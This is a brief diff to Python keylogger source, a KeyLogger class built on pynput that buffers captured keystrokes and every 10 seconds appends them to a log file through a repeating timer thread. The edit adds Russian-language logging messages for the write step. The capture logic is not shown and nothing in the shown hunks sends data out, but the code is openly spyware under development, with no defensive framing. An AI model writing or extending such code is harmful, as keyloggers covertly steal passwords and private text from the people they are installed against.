@@ -2,7 +2,7 @@
 import pynput.keyboard
 import threading
 import os
-
+import logging
 
 class KeyLogger:
     def __init__(self):
@@ -29,9 +29,10 @@ class KeyLogger:
             try:
                 with open(self.path, "a") as file:
                     file.write(self.log)
+                    logging.info(f"[+] Лог записан в файл {self.path}")
                 self.log = "" 
             except Exception as e:
-                print(f"Ошибка записи в файл: {e}")
+                logging.error(f"[!!] Ошибка записи в файл кейлоггера: {e}")
         self.timer = threading.Timer(10, self.report)
         self.timer.start()
 
